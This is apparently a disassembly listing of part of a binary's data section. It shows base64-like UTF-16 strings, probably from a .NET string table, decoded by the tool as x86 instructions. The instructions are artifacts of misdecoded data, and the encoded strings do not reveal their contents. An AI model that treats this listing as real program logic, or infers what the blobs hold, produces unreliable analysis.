  40b1aa:	00 6a 00             	add    %ch,0x0(%edx)
  40b1ad:	4d                   	dec    %ebp
  40b1ae:	00 6f 00             	add    %ch,0x0(%edi)
  40b1b1:	77 00                	ja     0x40b1b3
  40b1b3:	4b                   	dec    %ebx
  40b1b4:	00 43 00             	add    %al,0x0(%ebx)
  40b1b7:	55                   	push   %ebp
  40b1b8:	00 48 00             	add    %cl,0x0(%eax)
  40b1bb:	55                   	push   %ebp
  40b1bc:	00 43 00             	add    %al,0x0(%ebx)
  40b1bf:	54                   	push   %esp
  40b1c0:	00 65 00             	add    %ah,0x0(%ebp)
  40b1c3:	69 00 51 00 47 00    	imul   $0x470051,(%eax),%eax
  40b1c9:	58                   	pop    %eax
  40b1ca:	00 62 00             	add    %ah,0x0(%edx)
  40b1cd:	33 00                	xor    (%eax),%eax
  40b1cf:	4f                   	dec    %edi
  40b1d0:	00 71 00             	add    %dh,0x0(%ecx)
  40b1d3:	43                   	inc    %ebx
  40b1d4:	00 76 00             	add    %dh,0x0(%esi)
  40b1d7:	4c                   	dec    %esp
  40b1d8:	00 62 00             	add    %ah,0x0(%edx)
  40b1db:	36 00 56 00          	add    %dl,%ss:0x0(%esi)
  40b1df:	70 00                	jo     0x40b1e1
  40b1e1:	4e                   	dec    %esi
  40b1e2:	00 42 00             	add    %al,0x0(%edx)
  40b1e5:	4c                   	dec    %esp
  40b1e6:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
  40b1ea:	00 57 00             	add    %dl,0x0(%edi)
  40b1ed:	41                   	inc    %ecx
  40b1ee:	00 6f 00             	add    %ch,0x0(%edi)
  40b1f1:	4c                   	dec    %esp
  40b1f2:	00 48 00             	add    %cl,0x0(%eax)
  40b1f5:	33 00                	xor    (%eax),%eax
  40b1f7:	76 00                	jbe    0x40b1f9
  40b1f9:	74 00                	je     0x40b1fb
  40b1fb:	4b                   	dec    %ebx
  40b1fc:	00 2b                	add    %ch,(%ebx)
  40b1fe:	00 52 00             	add    %dl,0x0(%edx)
  40b201:	31 00                	xor    %eax,(%eax)
  40b203:	48                   	dec    %eax
  40b204:	00 41 00             	add    %al,0x0(%ecx)
  40b207:	73 00                	jae    0x40b209
  40b209:	50                   	push   %eax
  40b20a:	00 53 00             	add    %dl,0x0(%ebx)
  40b20d:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  40b211:	31 00                	xor    %eax,(%eax)
  40b213:	55                   	push   %ebp
  40b214:	00 36                	add    %dh,(%esi)
  40b216:	00 46 00             	add    %al,0x0(%esi)
  40b219:	61                   	popa
  40b21a:	00 61 00             	add    %ah,0x0(%ecx)
  40b21d:	6c                   	insb   (%dx),%es:(%edi)
  40b21e:	00 59 00             	add    %bl,0x0(%ecx)
  40b221:	6d                   	insl   (%dx),%es:(%edi)
  40b222:	00 33                	add    %dh,(%ebx)
  40b224:	00 59 00             	add    %bl,0x0(%ecx)
  40b227:	44                   	inc    %esp
  40b228:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
  40b22c:	00 63 00             	add    %ah,0x0(%ebx)
  40b22f:	47                   	inc    %edi
  40b230:	00 6e 00             	add    %ch,0x0(%esi)
  40b233:	4e                   	dec    %esi
  40b234:	00 43 00             	add    %al,0x0(%ebx)
  40b237:	38 00                	cmp    %al,(%eax)
  40b239:	44                   	inc    %esp
  40b23a:	00 39                	add    %bh,(%ecx)
  40b23c:	00 6f 00             	add    %ch,0x0(%edi)
  40b23f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b240:	00 55 00             	add    %dl,0x0(%ebp)
  40b243:	35 00 6d 00 78       	xor    $0x78006d00,%eax
  40b248:	00 59 00             	add    %bl,0x0(%ecx)
  40b24b:	4a                   	dec    %edx
  40b24c:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  40b250:	00 55 00             	add    %dl,0x0(%ebp)
  40b253:	36 00 59 00          	add    %bl,%ss:0x0(%ecx)
  40b257:	77 00                	ja     0x40b259
  40b259:	49                   	dec    %ecx
  40b25a:	00 6f 00             	add    %ch,0x0(%edi)
  40b25d:	72 00                	jb     0x40b25f
  40b25f:	69 00 5a 00 44 00    	imul   $0x44005a,(%eax),%eax
  40b265:	46                   	inc    %esi
  40b266:	00 68 00             	add    %ch,0x0(%eax)
  40b269:	71 00                	jno    0x40b26b
  40b26b:	7a 00                	jp     0x40b26d
  40b26d:	44                   	inc    %esp
  40b26e:	00 39                	add    %bh,(%ecx)
  40b270:	00 59 00             	add    %bl,0x0(%ecx)
  40b273:	50                   	push   %eax
  40b274:	00 2f                	add    %ch,(%edi)
  40b276:	00 2b                	add    %ch,(%ebx)
  40b278:	00 33                	add    %dh,(%ebx)
  40b27a:	00 63 00             	add    %ah,0x0(%ebx)
  40b27d:	48                   	dec    %eax
  40b27e:	00 38                	add    %bh,(%eax)
  40b280:	00 68 00             	add    %ch,0x0(%eax)
  40b283:	6c                   	insb   (%dx),%es:(%edi)
  40b284:	00 72 00             	add    %dh,0x0(%edx)
  40b287:	59                   	pop    %ecx
  40b288:	00 52 00             	add    %dl,0x0(%edx)
  40b28b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b28c:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40b290:	00 7a 00             	add    %bh,0x0(%edx)
  40b293:	6a 00                	push   $0x0
  40b295:	7a 00                	jp     0x40b297
  40b297:	52                   	push   %edx
  40b298:	00 4a 00             	add    %cl,0x0(%edx)
  40b29b:	48                   	dec    %eax
  40b29c:	00 58 00             	add    %bl,0x0(%eax)
  40b29f:	4b                   	dec    %ebx
  40b2a0:	00 42 00             	add    %al,0x0(%edx)
  40b2a3:	79 00                	jns    0x40b2a5
  40b2a5:	34 00                	xor    $0x0,%al
  40b2a7:	62 00                	bound  %eax,(%eax)
  40b2a9:	4b                   	dec    %ebx
  40b2aa:	00 5a 00             	add    %bl,0x0(%edx)
  40b2ad:	42                   	inc    %edx
  40b2ae:	00 58 00             	add    %bl,0x0(%eax)
  40b2b1:	4e                   	dec    %esi
  40b2b2:	00 6e 00             	add    %ch,0x0(%esi)
  40b2b5:	72 00                	jb     0x40b2b7
  40b2b7:	79 00                	jns    0x40b2b9
  40b2b9:	44                   	inc    %esp
  40b2ba:	00 2b                	add    %ch,(%ebx)
  40b2bc:	00 47 00             	add    %al,0x0(%edi)
  40b2bf:	2b 00                	sub    (%eax),%eax
  40b2c1:	71 00                	jno    0x40b2c3
  40b2c3:	54                   	push   %esp
  40b2c4:	00 31                	add    %dh,(%ecx)
  40b2c6:	00 77 00             	add    %dh,0x0(%edi)
  40b2c9:	42                   	inc    %edx
  40b2ca:	00 76 00             	add    %dh,0x0(%esi)
  40b2cd:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2ce:	00 58 00             	add    %bl,0x0(%eax)
  40b2d1:	42                   	inc    %edx
  40b2d2:	00 6a 00             	add    %ch,0x0(%edx)
  40b2d5:	74 00                	je     0x40b2d7
  40b2d7:	47                   	inc    %edi
  40b2d8:	00 2f                	add    %ch,(%edi)
  40b2da:	00 77 00             	add    %dh,0x0(%edi)
  40b2dd:	49                   	dec    %ecx
  40b2de:	00 6b 00             	add    %ch,0x0(%ebx)
  40b2e1:	37                   	aaa
  40b2e2:	00 68 00             	add    %ch,0x0(%eax)
  40b2e5:	52                   	push   %edx
  40b2e6:	00 51 00             	add    %dl,0x0(%ecx)
  40b2e9:	63 00                	arpl   %eax,(%eax)
  40b2eb:	57                   	push   %edi
  40b2ec:	00 76 00             	add    %dh,0x0(%esi)
  40b2ef:	4f                   	dec    %edi
  40b2f0:	00 51 00             	add    %dl,0x0(%ecx)
  40b2f3:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2f4:	00 31                	add    %dh,(%ecx)
  40b2f6:	00 50 00             	add    %dl,0x0(%eax)
  40b2f9:	4a                   	dec    %edx
  40b2fa:	00 58 00             	add    %bl,0x0(%eax)
  40b2fd:	58                   	pop    %eax
  40b2fe:	00 4d 00             	add    %cl,0x0(%ebp)
  40b301:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  40b305:	64 00 31             	add    %dh,%fs:(%ecx)
  40b308:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40b30c:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b310:	00 55 00             	add    %dl,0x0(%ebp)
  40b313:	75 00                	jne    0x40b315
  40b315:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  40b319:	42                   	inc    %edx
  40b31a:	00 48 00             	add    %cl,0x0(%eax)
  40b31d:	55                   	push   %ebp
  40b31e:	00 61 00             	add    %ah,0x0(%ecx)
  40b321:	70 00                	jo     0x40b323
  40b323:	61                   	popa
  40b324:	00 71 00             	add    %dh,0x0(%ecx)
  40b327:	44                   	inc    %esp
  40b328:	00 56 00             	add    %dl,0x0(%esi)
  40b32b:	42                   	inc    %edx
  40b32c:	00 62 00             	add    %ah,0x0(%edx)
  40b32f:	6a 00                	push   $0x0
  40b331:	51                   	push   %ecx
  40b332:	00 52 00             	add    %dl,0x0(%edx)
  40b335:	30 00                	xor    %al,(%eax)
  40b337:	38 00                	cmp    %al,(%eax)
  40b339:	6b 00 46             	imul   $0x46,(%eax),%eax
  40b33c:	00 41 00             	add    %al,0x0(%ecx)
  40b33f:	57                   	push   %edi
  40b340:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40b344:	00 50 00             	add    %dl,0x0(%eax)
  40b347:	48                   	dec    %eax
  40b348:	00 59 00             	add    %bl,0x0(%ecx)
  40b34b:	38 00                	cmp    %al,(%eax)
  40b34d:	4d                   	dec    %ebp
  40b34e:	00 4e 00             	add    %cl,0x0(%esi)
  40b351:	6e                   	outsb  %ds:(%esi),(%dx)
  40b352:	00 79 00             	add    %bh,0x0(%ecx)
  40b355:	70 00                	jo     0x40b357
  40b357:	57                   	push   %edi
  40b358:	00 56 00             	add    %dl,0x0(%esi)
  40b35b:	71 00                	jno    0x40b35d
  40b35d:	42                   	inc    %edx
  40b35e:	00 78 00             	add    %bh,0x0(%eax)
  40b361:	6f                   	outsl  %ds:(%esi),(%dx)
  40b362:	00 39                	add    %bh,(%ecx)
  40b364:	00 49 00             	add    %cl,0x0(%ecx)
  40b367:	41                   	inc    %ecx
  40b368:	00 4f 00             	add    %cl,0x0(%edi)
  40b36b:	51                   	push   %ecx
  40b36c:	00 45 00             	add    %al,0x0(%ebp)
  40b36f:	49                   	dec    %ecx
  40b370:	00 45 00             	add    %al,0x0(%ebp)
  40b373:	66 00 37             	data16 add %dh,(%edi)
  40b376:	00 44 00 4b          	add    %al,0x4b(%eax,%eax,1)
  40b37a:	00 4c 00 48          	add    %cl,0x48(%eax,%eax,1)
  40b37e:	00 57 00             	add    %dl,0x0(%edi)
  40b381:	49                   	dec    %ecx
  40b382:	00 71 00             	add    %dh,0x0(%ecx)
  40b385:	6b 00 48             	imul   $0x48,(%eax),%eax
  40b388:	00 71 00             	add    %dh,0x0(%ecx)
  40b38b:	6a 00                	push   $0x0
  40b38d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b38e:	00 54 00 53          	add    %dl,0x53(%eax,%eax,1)
  40b392:	00 2b                	add    %ch,(%ebx)
  40b394:	00 68 00             	add    %ch,0x0(%eax)
  40b397:	51                   	push   %ecx
  40b398:	00 31                	add    %dh,(%ecx)
  40b39a:	00 76 00             	add    %dh,0x0(%esi)
  40b39d:	4a                   	dec    %edx
  40b39e:	00 59 00             	add    %bl,0x0(%ecx)
  40b3a1:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  40b3a5:	7a 00                	jp     0x40b3a7
  40b3a7:	78 00                	js     0x40b3a9
  40b3a9:	56                   	push   %esi
  40b3aa:	00 42 00             	add    %al,0x0(%edx)
  40b3ad:	72 00                	jb     0x40b3af
  40b3af:	72 00                	jb     0x40b3b1
  40b3b1:	48                   	dec    %eax
  40b3b2:	00 75 00             	add    %dh,0x0(%ebp)
  40b3b5:	4d                   	dec    %ebp
  40b3b6:	00 45 00             	add    %al,0x0(%ebp)
  40b3b9:	58                   	pop    %eax
  40b3ba:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  40b3be:	00 38                	add    %bh,(%eax)
  40b3c0:	00 6f 00             	add    %ch,0x0(%edi)
  40b3c3:	62 00                	bound  %eax,(%eax)
  40b3c5:	77 00                	ja     0x40b3c7
  40b3c7:	4e                   	dec    %esi
  40b3c8:	00 6a 00             	add    %ch,0x0(%edx)
  40b3cb:	35 00 75 00 78       	xor    $0x78007500,%eax
  40b3d0:	00 4d 00             	add    %cl,0x0(%ebp)
  40b3d3:	52                   	push   %edx
  40b3d4:	00 32                	add    %dh,(%edx)
  40b3d6:	00 48 00             	add    %cl,0x0(%eax)
  40b3d9:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40b3dd:	52                   	push   %edx
  40b3de:	00 43 00             	add    %al,0x0(%ebx)
  40b3e1:	70 00                	jo     0x40b3e3
  40b3e3:	78 00                	js     0x40b3e5
  40b3e5:	44                   	inc    %esp
  40b3e6:	00 52 00             	add    %dl,0x0(%edx)
  40b3e9:	65 00 38             	add    %bh,%gs:(%eax)
  40b3ec:	00 4b 00             	add    %cl,0x0(%ebx)
  40b3ef:	34 00                	xor    $0x0,%al
  40b3f1:	70 00                	jo     0x40b3f3
  40b3f3:	41                   	inc    %ecx
  40b3f4:	00 7a 00             	add    %bh,0x0(%edx)
  40b3f7:	73 00                	jae    0x40b3f9
  40b3f9:	55                   	push   %ebp
  40b3fa:	00 55 00             	add    %dl,0x0(%ebp)
  40b3fd:	79 00                	jns    0x40b3ff
  40b3ff:	31 00                	xor    %eax,(%eax)
  40b401:	68 00 35 00 33       	push   $0x33003500
  40b406:	00 6b 00             	add    %ch,0x0(%ebx)
  40b409:	34 00                	xor    $0x0,%al
  40b40b:	7a 00                	jp     0x40b40d
  40b40d:	79 00                	jns    0x40b40f
  40b40f:	2b 00                	sub    (%eax),%eax
  40b411:	58                   	pop    %eax
  40b412:	00 67 00             	add    %ah,0x0(%edi)
  40b415:	52                   	push   %edx
  40b416:	00 6d 00             	add    %ch,0x0(%ebp)
  40b419:	67 00 74 00          	add    %dh,0x0(%si)
  40b41d:	30 00                	xor    %al,(%eax)
  40b41f:	48                   	dec    %eax
  40b420:	00 67 00             	add    %ah,0x0(%edi)
  40b423:	38 00                	cmp    %al,(%eax)
  40b425:	69 00 2f 00 4f 00    	imul   $0x4f002f,(%eax),%eax
  40b42b:	34 00                	xor    $0x0,%al
  40b42d:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  40b431:	59                   	pop    %ecx
  40b432:	00 43 00             	add    %al,0x0(%ebx)
  40b435:	2b 00                	sub    (%eax),%eax
  40b437:	42                   	inc    %edx
  40b438:	00 67 00             	add    %ah,0x0(%edi)
  40b43b:	37                   	aaa
  40b43c:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  40b440:	00 33                	add    %dh,(%ebx)
  40b442:	00 67 00             	add    %ah,0x0(%edi)
  40b445:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b44a:	80 b1 41 00 2b 00 4c 	xorb   $0x4c,0x2b0041(%ecx)
  40b451:	00 61 00             	add    %ah,0x0(%ecx)
  40b454:	2f                   	das
  40b455:	00 41 00             	add    %al,0x0(%ecx)
  40b458:	6a 00                	push   $0x0
  40b45a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b45e:	6a 00                	push   $0x0
  40b460:	31 00                	xor    %eax,(%eax)
  40b462:	49                   	dec    %ecx
  40b463:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40b467:	00 2b                	add    %ch,(%ebx)
  40b469:	00 57 00             	add    %dl,0x0(%edi)
  40b46c:	2f                   	das
  40b46d:	00 49 00             	add    %cl,0x0(%ecx)
  40b470:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  40b474:	4f                   	dec    %edi
  40b475:	00 6a 00             	add    %ch,0x0(%edx)
  40b478:	5a                   	pop    %edx
  40b479:	00 52 00             	add    %dl,0x0(%edx)
  40b47c:	45                   	inc    %ebp
  40b47d:	00 4d 00             	add    %cl,0x0(%ebp)
  40b480:	35 00 46 00 6c       	xor    $0x6c004600,%eax
  40b485:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  40b489:	00 77 00             	add    %dh,0x0(%edi)
  40b48c:	32 00                	xor    (%eax),%al
  40b48e:	43                   	inc    %ebx
  40b48f:	00 48 00             	add    %cl,0x0(%eax)
  40b492:	6d                   	insl   (%dx),%es:(%edi)
  40b493:	00 69 00             	add    %ch,0x0(%ecx)
  40b496:	45                   	inc    %ebp
  40b497:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
  40b49b:	00 70 00             	add    %dh,0x0(%eax)
  40b49e:	4d                   	dec    %ebp
  40b49f:	00 35 00 76 00 57    	add    %dh,0x57007600
  40b4a5:	00 6a 00             	add    %ch,0x0(%edx)
  40b4a8:	34 00                	xor    $0x0,%al
  40b4aa:	61                   	popa
  40b4ab:	00 75 00             	add    %dh,0x0(%ebp)
  40b4ae:	53                   	push   %ebx
  40b4af:	00 51 00             	add    %dl,0x0(%ecx)
  40b4b2:	63 00                	arpl   %eax,(%eax)
  40b4b4:	50                   	push   %eax
  40b4b5:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
  40b4b9:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4bc:	7a 00                	jp     0x40b4be
  40b4be:	30 00                	xor    %al,(%eax)
  40b4c0:	73 00                	jae    0x40b4c2
  40b4c2:	57                   	push   %edi
  40b4c3:	00 72 00             	add    %dh,0x0(%edx)
  40b4c6:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  40b4c9:	00 68 00             	add    %ch,0x0(%eax)
  40b4cc:	50                   	push   %eax
  40b4cd:	00 4c 00 4e          	add    %cl,0x4e(%eax,%eax,1)
  40b4d1:	00 66 00             	add    %ah,0x0(%esi)
  40b4d4:	72 00                	jb     0x40b4d6
  40b4d6:	42                   	inc    %edx
  40b4d7:	00 41 00             	add    %al,0x0(%ecx)
  40b4da:	37                   	aaa
  40b4db:	00 6e 00             	add    %ch,0x0(%esi)
  40b4de:	47                   	inc    %edi
  40b4df:	00 31                	add    %dh,(%ecx)
  40b4e1:	00 36                	add    %dh,(%esi)
  40b4e3:	00 55 00             	add    %dl,0x0(%ebp)
  40b4e6:	52                   	push   %edx
  40b4e7:	00 4a 00             	add    %cl,0x0(%edx)
  40b4ea:	70 00                	jo     0x40b4ec
  40b4ec:	67 00 50 00          	add    %dl,0x0(%bx,%si)
  40b4f0:	73 00                	jae    0x40b4f2
  40b4f2:	69 00 2f 00 67 00    	imul   $0x67002f,(%eax),%eax
  40b4f8:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b4fd:	80 b1 50 00 2b 00 48 	xorb   $0x48,0x2b0050(%ecx)
  40b504:	00 57 00             	add    %dl,0x0(%edi)
  40b507:	35 00 6f 00 6b       	xor    $0x6b006f00,%eax
  40b50c:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
  40b510:	00 58 00             	add    %bl,0x0(%eax)
  40b513:	54                   	push   %esp
  40b514:	00 6d 00             	add    %ch,0x0(%ebp)
  40b517:	32 00                	xor    (%eax),%al
  40b519:	64 00 44 00 37       	add    %al,%fs:0x37(%eax,%eax,1)
  40b51e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b521:	55                   	push   %ebp
  40b522:	00 75 00             	add    %dh,0x0(%ebp)
  40b525:	43                   	inc    %ebx
  40b526:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  40b52a:	00 7a 00             	add    %bh,0x0(%edx)
  40b52d:	75 00                	jne    0x40b52f
  40b52f:	39 00                	cmp    %eax,(%eax)
  40b531:	41                   	inc    %ecx
  40b532:	00 38                	add    %bh,(%eax)
  40b534:	00 36                	add    %dh,(%esi)
  40b536:	00 59 00             	add    %bl,0x0(%ecx)
  40b539:	73 00                	jae    0x40b53b
  40b53b:	74 00                	je     0x40b53d
  40b53d:	33 00                	xor    (%eax),%eax
  40b53f:	38 00                	cmp    %al,(%eax)
  40b541:	47                   	inc    %edi
  40b542:	00 4e 00             	add    %cl,0x0(%esi)
  40b545:	68 00 64 00 31       	push   $0x31006400
  40b54a:	00 59 00             	add    %bl,0x0(%ecx)
  40b54d:	76 00                	jbe    0x40b54f
  40b54f:	4f                   	dec    %edi
  40b550:	00 36                	add    %dh,(%esi)
  40b552:	00 72 00             	add    %dh,0x0(%edx)
  40b555:	45                   	inc    %ebp
  40b556:	00 6a 00             	add    %ch,0x0(%edx)
  40b559:	4c                   	dec    %esp
  40b55a:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40b55e:	00 6d 00             	add    %ch,0x0(%ebp)
  40b561:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  40b564:	00 59 00             	add    %bl,0x0(%ecx)
  40b567:	42                   	inc    %edx
  40b568:	00 44 00 53          	add    %al,0x53(%eax,%eax,1)
  40b56c:	00 63 00             	add    %ah,0x0(%ebx)
  40b56f:	30 00                	xor    %al,(%eax)
  40b571:	74 00                	je     0x40b573
  40b573:	43                   	inc    %ebx
  40b574:	00 4b 00             	add    %cl,0x0(%ebx)
  40b577:	72 00                	jb     0x40b579
  40b579:	39 00                	cmp    %eax,(%eax)
  40b57b:	46                   	inc    %esi
  40b57c:	00 6d 00             	add    %ch,0x0(%ebp)
  40b57f:	70 00                	jo     0x40b581
  40b581:	4b                   	dec    %ebx
  40b582:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
  40b586:	00 76 00             	add    %dh,0x0(%esi)
  40b589:	51                   	push   %ecx
  40b58a:	00 6d 00             	add    %ch,0x0(%ebp)
  40b58d:	51                   	push   %ecx
  40b58e:	00 65 00             	add    %ah,0x0(%ebp)
  40b591:	6f                   	outsl  %ds:(%esi),(%dx)
  40b592:	00 71 00             	add    %dh,0x0(%ecx)
  40b595:	52                   	push   %edx
  40b596:	00 64 00 59          	add    %ah,0x59(%eax,%eax,1)
  40b59a:	00 61 00             	add    %ah,0x0(%ecx)
  40b59d:	59                   	pop    %ecx
  40b59e:	00 66 00             	add    %ah,0x0(%esi)
  40b5a1:	74 00                	je     0x40b5a3
  40b5a3:	4c                   	dec    %esp
  40b5a4:	00 6d 00             	add    %ch,0x0(%ebp)
  40b5a7:	38 00                	cmp    %al,(%eax)
  40b5a9:	41                   	inc    %ecx
  40b5aa:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b5b0:	80 b1 75 00 58 00 6a 	xorb   $0x6a,0x580075(%ecx)
  40b5b7:	00 59 00             	add    %bl,0x0(%ecx)
  40b5ba:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5bb:	00 52 00             	add    %dl,0x0(%edx)
  40b5be:	54                   	push   %esp
  40b5bf:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b5c2:	48                   	dec    %eax
  40b5c3:	00 78 00             	add    %bh,0x0(%eax)
  40b5c6:	42                   	inc    %edx
  40b5c7:	00 58 00             	add    %bl,0x0(%eax)
  40b5ca:	2b 00                	sub    (%eax),%eax
  40b5cc:	45                   	inc    %ebp
  40b5cd:	00 73 00             	add    %dh,0x0(%ebx)
  40b5d0:	6a 00                	push   $0x0
  40b5d2:	6a 00                	push   $0x0
  40b5d4:	4c                   	dec    %esp
  40b5d5:	00 4b 00             	add    %cl,0x0(%ebx)
  40b5d8:	45                   	inc    %ebp
  40b5d9:	00 68 00             	add    %ch,0x0(%eax)
  40b5dc:	6d                   	insl   (%dx),%es:(%edi)
  40b5dd:	00 6b 00             	add    %ch,0x0(%ebx)
  40b5e0:	58                   	pop    %eax
  40b5e1:	00 2f                	add    %ch,(%edi)
  40b5e3:	00 4c 00 74          	add    %cl,0x74(%eax,%eax,1)
  40b5e7:	00 7a 00             	add    %bh,0x0(%edx)
  40b5ea:	47                   	inc    %edi
  40b5eb:	00 5a 00             	add    %bl,0x0(%edx)
  40b5ee:	53                   	push   %ebx
  40b5ef:	00 50 00             	add    %dl,0x0(%eax)
  40b5f2:	52                   	push   %edx
  40b5f3:	00 58 00             	add    %bl,0x0(%eax)
  40b5f6:	2f                   	das
  40b5f7:	00 55 00             	add    %dl,0x0(%ebp)
  40b5fa:	39 00                	cmp    %eax,(%eax)
  40b5fc:	6c                   	insb   (%dx),%es:(%edi)
  40b5fd:	00 30                	add    %dh,(%eax)
  40b5ff:	00 4d 00             	add    %cl,0x0(%ebp)
  40b602:	4b                   	dec    %ebx
  40b603:	00 33                	add    %dh,(%ebx)
  40b605:	00 4f 00             	add    %cl,0x0(%edi)
  40b608:	6d                   	insl   (%dx),%es:(%edi)
  40b609:	00 45 00             	add    %al,0x0(%ebp)
  40b60c:	35 00 36 00 46       	xor    $0x46003600,%eax
  40b611:	00 68 00             	add    %ch,0x0(%eax)
  40b614:	51                   	push   %ecx
  40b615:	00 65 00             	add    %ah,0x0(%ebp)
  40b618:	6d                   	insl   (%dx),%es:(%edi)
  40b619:	00 6b 00             	add    %ch,0x0(%ebx)
  40b61c:	47                   	inc    %edi
  40b61d:	00 57 00             	add    %dl,0x0(%edi)
  40b620:	68 00 48 00 36       	push   $0x36004800
  40b625:	00 41 00             	add    %al,0x0(%ecx)
  40b628:	43                   	inc    %ebx
  40b629:	00 70 00             	add    %dh,0x0(%eax)
  40b62c:	78 00                	js     0x40b62e
  40b62e:	34 00                	xor    $0x0,%al
  40b630:	6d                   	insl   (%dx),%es:(%edi)
  40b631:	00 38                	add    %bh,(%eax)
  40b633:	00 52 00             	add    %dl,0x0(%edx)
  40b636:	56                   	push   %esi
  40b637:	00 7a 00             	add    %bh,0x0(%edx)
  40b63a:	44                   	inc    %esp
  40b63b:	00 7a 00             	add    %bh,0x0(%edx)
  40b63e:	76 00                	jbe    0x40b640
  40b640:	55                   	push   %ebp
  40b641:	00 30                	add    %dh,(%eax)
  40b643:	00 72 00             	add    %dh,0x0(%edx)
  40b646:	32 00                	xor    (%eax),%al
  40b648:	6b 00 58             	imul   $0x58,(%eax),%eax
  40b64b:	00 47 00             	add    %al,0x0(%edi)
  40b64e:	51                   	push   %ecx
  40b64f:	00 2f                	add    %ch,(%edi)
  40b651:	00 59 00             	add    %bl,0x0(%ecx)
  40b654:	33 00                	xor    (%eax),%eax
  40b656:	72 00                	jb     0x40b658
  40b658:	44                   	inc    %esp
  40b659:	00 30                	add    %dh,(%eax)
  40b65b:	00 67 00             	add    %ah,0x0(%edi)
  40b65e:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b663:	03 33                	add    (%ebx),%esi
  40b665:	00 00                	add    %al,(%eax)
  40b667:	80 b1 50 00 62 00 57 	xorb   $0x57,0x620050(%ecx)
  40b66e:	00 61 00             	add    %ah,0x0(%ecx)
  40b671:	73 00                	jae    0x40b673
  40b673:	71 00                	jno    0x40b675
  40b675:	68 00 4d 00 63       	push   $0x63004d00
  40b67a:	00 61 00             	add    %ah,0x0(%ecx)
  40b67d:	47                   	inc    %edi
  40b67e:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  40b682:	00 79 00             	add    %bh,0x0(%ecx)
  40b685:	32 00                	xor    (%eax),%al
  40b687:	45                   	inc    %ebp
  40b688:	00 2f                	add    %ch,(%edi)
  40b68a:	00 30                	add    %dh,(%eax)
  40b68c:	00 47 00             	add    %al,0x0(%edi)
  40b68f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b690:	00 4c 00 77          	add    %cl,0x77(%eax,%eax,1)
  40b694:	00 78 00             	add    %bh,0x0(%eax)
  40b697:	72 00                	jb     0x40b699
  40b699:	45                   	inc    %ebp
  40b69a:	00 65 00             	add    %ah,0x0(%ebp)
  40b69d:	42                   	inc    %edx
  40b69e:	00 41 00             	add    %al,0x0(%ecx)
  40b6a1:	6c                   	insb   (%dx),%es:(%edi)
  40b6a2:	00 6d 00             	add    %ch,0x0(%ebp)
  40b6a5:	74 00                	je     0x40b6a7
  40b6a7:	50                   	push   %eax
  40b6a8:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40b6ac:	00 47 00             	add    %al,0x0(%edi)
  40b6af:	49                   	dec    %ecx
  40b6b0:	00 59 00             	add    %bl,0x0(%ecx)
  40b6b3:	37                   	aaa
  40b6b4:	00 63 00             	add    %ah,0x0(%ebx)
  40b6b7:	4e                   	dec    %esi
  40b6b8:	00 77 00             	add    %dh,0x0(%edi)
  40b6bb:	74 00                	je     0x40b6bd
  40b6bd:	4b                   	dec    %ebx
  40b6be:	00 50 00             	add    %dl,0x0(%eax)
  40b6c1:	38 00                	cmp    %al,(%eax)
  40b6c3:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6c4:	00 47 00             	add    %al,0x0(%edi)
  40b6c7:	55                   	push   %ebp
  40b6c8:	00 76 00             	add    %dh,0x0(%esi)
  40b6cb:	74 00                	je     0x40b6cd
  40b6cd:	38 00                	cmp    %al,(%eax)
  40b6cf:	73 00                	jae    0x40b6d1
  40b6d1:	6b 00 44             	imul   $0x44,(%eax),%eax
  40b6d4:	00 79 00             	add    %bh,0x0(%ecx)
  40b6d7:	35 00 43 00 33       	xor    $0x33004300,%eax
  40b6dc:	00 4f 00             	add    %cl,0x0(%edi)
  40b6df:	78 00                	js     0x40b6e1
  40b6e1:	4c                   	dec    %esp
  40b6e2:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
  40b6e6:	00 53 00             	add    %dl,0x0(%ebx)
  40b6e9:	68 00 37 00 36       	push   $0x36003700
  40b6ee:	00 56 00             	add    %dl,0x0(%esi)
  40b6f1:	66 00 6c 00 4f       	data16 add %ch,0x4f(%eax,%eax,1)
  40b6f6:	00 35 00 6a 00 7a    	add    %dh,0x7a006a00
